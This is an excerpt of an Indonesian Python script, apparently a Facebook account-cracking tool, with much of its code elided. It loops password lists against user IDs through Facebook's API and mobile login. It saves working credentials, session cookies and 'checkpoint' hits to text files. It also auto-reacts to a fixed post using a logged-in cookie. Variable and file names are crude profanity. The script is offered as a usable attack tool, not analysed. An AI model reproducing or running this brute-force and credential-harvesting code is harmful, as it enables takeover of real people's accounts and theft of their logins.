# Anying mulu record
# Update Tuesday 24 may 2021
# Coded by ManTaL StuDio
# sorry bro if the coding is messy, lazy to tidy it up :v
# fb me : https://m.facebook.com/
...
def hasil(ngocok,ismylife):
	if len(ngocok) != 0 or len(ismylife) != 0:
		...
		else:print("[*] \x1b[1;32mHasil Live Tersimpan Di File : kontol.txt\x1b[0m")
		if len(ismylife)==0:pass
		else:print("[*] \x1b[1;33mHasil Chek Tersimpan Di File : memek.txt")
		exit()
...
class ngentod:
	...
	def fuck(self):
		pilih=input("[?] Pilih : ")
		if pilih in["l","L"]:
			tod=open("kontol.txt","r").read()
			tOd=open("memek.txt","r").read()
				...
				if pwek in(""," "):
					...
					def xhh(xss=None):
						...
						if pilih in(""," "):
							...
							print("[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : kontol.txt\n[*] Hasil CHEK Tersimpan Di File : memek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
	...
	def crackapi(self,user,ox):
		global ok,cp,cot
		for pw in ox:
			if user in open("kontol.txt","r").read() or user in open("memek.txt","r").read():
				break
			else:
				ses=req.Session()
				...
				if "session_key" in send.text and "EAAA" in send.text:
					...
					open("kontol.txt","a").write(f"{user}|{pw}\n")
					live.append(f"{user}{pw}")
					break
				elif "www.facebook.com" in send.json()["error_msg"]:
					cp+=1
					print(f"\r\x1b[1;33m * ---> {user}|{pw}\x1b[0m\n",end="")
					open("memek.txt","a").write(f"{user}|{pw}\n")
	...
	def modol(self,user,ox,beol,**kwargs):
		global ok,cp,cot
		for pw in ox:
			if user in open("kontol.txt","r").read() or user in open("memek.txt","r").read(): break
			else:
				ses=req.Session()
				...
				if "c_user" in kuke:
					...
					open("kontol.txt","a").write(f"{kuke.get('c_user')}|{pw}|{kuki}\n")
					...
					open("memek.txt","a").write(f"{user}|{uid}|{pw}\n")
	...
	def login(self):
		try:
			...
			if "mbasic_logout_button" in cek:
				print("\n\n[*] Hai, Welcome "+re.findall("\<title\>(.*?)<\/title\>",cek)[0]+" Semvakv")
				waktu(1)
...
def react_me(coki,url):
	try:
		a=parser(req.get(url+"/reactions/picker/?is_permalink=1&ft_id= 278424967650575",cookies=coki).text,"html.parser")
		if "Hapus" not in str(a):
			for x in a.find_all("a"):
				if "reaction_type=5" in x.get("href"):
...
if __name__=="__main__":
	...
	if os.path.exists("memek.txt"): pass
	else: open("memek.txt","a").close()
	if os.path.exists("kontol.txt"): pass
	else: open("kontol.txt","a").close()
	ngentod().menu()


"""
Create By MaNtaL StuDiO
GITHUB : https://github.com/Mantalstudio
"""
